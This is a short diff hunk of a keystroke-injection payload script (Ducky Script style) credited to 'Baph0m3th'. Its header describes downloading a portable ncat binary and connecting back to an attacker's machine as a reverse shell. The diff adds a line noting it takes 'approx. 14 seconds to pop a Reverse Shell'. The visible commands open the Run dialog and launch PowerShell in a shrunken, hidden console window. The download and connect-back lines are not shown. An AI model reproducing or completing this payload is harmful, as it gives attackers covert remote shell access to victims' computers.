@@ -2,6 +2,7 @@ REM Author: Baph0m3th
 REM Description: Downloads portable ncat binary and use it to connect back to the attacker's machine
 REM Version:	1.0
 REM Category:	Reverse Shells
+REM Timing: approx. 14 seconds to pop a Reverse Shell
 GUI R
 DELAY 500
 STRING PowerShell.exe -noe -c ". mode.com con: lines=1 cols=12"
